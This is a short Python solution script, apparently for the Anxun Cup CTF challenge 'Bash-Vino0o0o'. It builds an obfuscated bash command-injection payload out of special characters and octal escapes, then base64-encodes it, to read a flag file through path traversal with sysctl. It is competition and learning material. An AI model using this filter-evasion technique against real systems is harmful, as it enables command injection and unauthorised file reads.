# 安洵杯Bash-Vino0o0o题目脚本

import base64
n = dict()
n[0] = '0'
n[1] = '${##}'
n[2] = '$((${##}<<${##}))'
n[3] = '$(($((${##}<<${##}))#${##}${##}))'
n[4] = '$((${##}<<$((${##}<<${##}))))'
n[5] = '$(($((${##}<<${##}))#${##}0${##}))'
n[6] = '$(($((${##}<<${##}))#${##}${##}0))'
n[7] = '$(($((${##}<<${##}))#${##}${##}${##}))'

f=''
def str_to_oct(cmd):                                #命令转换成八进制字符串
    s = ""
    for t in cmd:
        o = ('%s' % (oct(ord(t))))[2:]
        s+='\\'+o
    return s

def build(cmd):                                     #八进制字符串转换成字符
    payload = "$0<<<$0\<\<\<\$\\\'"
    s = str_to_oct(cmd).split('\\')
    for _ in s[1:]:
        payload+="\\\\"
        for i in _:
            payload+=n[int(i)]
    return payload+'\\\''
print(base64.b64encode(build('sysctl -n /../../../../../ffffaaaalag').encode()))